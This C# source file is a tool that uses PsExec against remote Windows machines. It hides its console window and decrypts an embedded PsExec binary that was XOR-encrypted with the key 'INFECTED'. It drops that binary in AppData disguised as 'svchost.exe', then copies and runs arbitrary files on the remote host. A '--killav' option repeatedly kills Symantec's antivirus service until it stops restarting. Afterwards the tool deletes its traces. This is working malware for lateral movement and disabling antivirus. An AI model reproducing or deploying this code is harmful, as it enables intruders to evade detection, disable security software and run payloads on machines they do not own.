using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

/*
IMPORTANT: You need to download the latest release of PsExec from here: https://docs.microsoft.com/en-us/sysinternals/downloads/psexec ,
after that, you need to encrypt it with a key for your choice (default: "INFECTED"; you can change
it in the function "createDecryptedPsExecInstance") using this program: https://github.com/gilmansharov/File-Encryptor-Decryptor
and then attach the encrypted file as a binary resource

OTHERWISE, IT WON'T WORK OR EVEN COMPILE !
*/
namespace PsExecHandler
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        /**
        <summary>
            Kills the process specified (you need to specify full process name.
            example: "chrome.exe")
        </summary>>
        */
        public static bool killProcess(string psExecPath, string remoteComputer, string processName)
        {
            int timeToSleep = 30000;
            string ProcessName = processName;
            string arguments = string.Format("-accepteula \\\\{0} taskkill /F /IM {1}", remoteComputer, ProcessName);
            try
            {
                var psi = new ProcessStartInfo(psExecPath, arguments)
                {
                    UseShellExecute = false,
                    ErrorDialog = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                
                //Console.WriteLine("Starting Process: {0}.\nArguments are: {1}", psi.FileName, psi.Arguments);
                var localProcess = Process.Start(psi);
                localProcess.WaitForExit(timeToSleep);
                if (!localProcess.HasExited)
                {
                    localProcess.Kill();
                }
            }
            catch(Exception ex)
            {
                //Console.WriteLine(ex.ToString());
                return false;
            }
            return true;
        }

        /**
        <summary>
            Execute a file that located in the local machine, in the remote computer.
            The function copies the file to the remote system and then executes it.
        </summary>
        */
        public static bool executeFile(string psExecPath, string fileLocalPath, string remoteComputer)
        {
            int timeToSleep = 30000;
            string arguments = string.Format("-accepteula \\\\{0} -c {1}", remoteComputer, fileLocalPath);
            try
            {
                var psi = new ProcessStartInfo(psExecPath, arguments)
                {
                    UseShellExecute = false,
                    ErrorDialog = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                //Console.WriteLine("Starting Process: {0}.\nArguments are: {1}", psi.FileName, psi.Arguments);
                var localProcess = Process.Start(psi);
                localProcess.WaitForExit(timeToSleep);
                if (!localProcess.HasExited)
                {
                    localProcess.Kill();
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
            return true;
        }


        /**
        <summary>
            Decrypts the PsExec file in the Resources and returns it's path
        </summary>
        */
        public static string createDecryptedPsExecInstance()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            path += "svchost.exe";
            string decryptionKey = "INFECTED";
            byte[] keyBytes = Encoding.Default.GetBytes(decryptionKey);
            byte[] fileBytes = Resource1.encrypted;
            for (Int32 i = 0; i < fileBytes.Length - 1; i++)
            {
                fileBytes[i] ^= (keyBytes[i % keyBytes.Length]);
            }
            FileStream file = File.Create(path);
            file.Write(fileBytes, 0, fileBytes.Length);
            file.Close();
            return path;
        }


        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0); /*Hides the Window*/

            bool killAV = false;
            int execFile = 0;
            int remoteInserted = 0;
            int isKillProcess = 0;
            string remoteComputer = null;
            string filePathToExecute = null;
            string processToKill = "";
            for(int i = 0; i< args.Length; i++)
            {
                if ((args[i].Equals("--killav")) || (args[i].Equals("-kA")))
                {
                    killAV = true;
                }
                else if ((args[i].Equals("--executefile")) || (args[i].Equals("-e")))
                {
                    execFile++;
                }
                else if ((args[i].Equals("--remotecomputer")) || args[i].Equals("-r"))
                {
                    remoteInserted++;
                }
                else if ((args[i]).Equals("--killprocess") || (args[i].Equals("-kP")))
                {
                    isKillProcess++;
                }
                else if (remoteInserted == 1)
                {
                    remoteComputer = args[i];
                    remoteInserted++;
                }

                else if (execFile == 1)
                {
                    filePathToExecute = "\"" + args[i] + "\"";
                    execFile++;
                }

                else if (isKillProcess == 1)
                {
                    processToKill = args[i];
                    isKillProcess++;
                }
            }

            
            if ((remoteInserted < 2) || (remoteComputer == null))
            {
                /*
                Console.WriteLine("Please type the following arguments:");
                Console.WriteLine("-r [IP] or --remotecomputer [IP]: used to specify the IP address (REQUIRED)");
                Console.WriteLine("-e [PATH] or --executefile [PATH]: used to specify a file path to execute (on the local computer)");
                Console.WriteLine("-kA or --killav: used to specify if you want to kill the symantec anti-virus on the remote computer");
                Console.WriteLine("-kP or --killprocess [PROCESSNAME]: specify which process you want to kill in the remote computer")
                */
                return;
            }


            try
            {
                string psExecPath = createDecryptedPsExecInstance();
                if (killAV)
                {
                    for (int i = 0; i < 15; i++) /*Symantec starts itself after kill, but after few times symantec gives up from starting itself*/
                        killProcess(psExecPath, remoteComputer, "ccSvcHst.exe");
                }
                if ((execFile == 2) && (filePathToExecute != null))
                {
                    executeFile(psExecPath, filePathToExecute, remoteComputer);
                }

                if ((isKillProcess == 2) && (processToKill != null))
                {
                    killProcess(psExecPath, remoteComputer, processToKill);
                }
                File.Delete(psExecPath);
            }
            catch(Exception e)
            {
                return;
            }
            //Console.WriteLine("Press Any Key To Exit...");
        }
    }
}
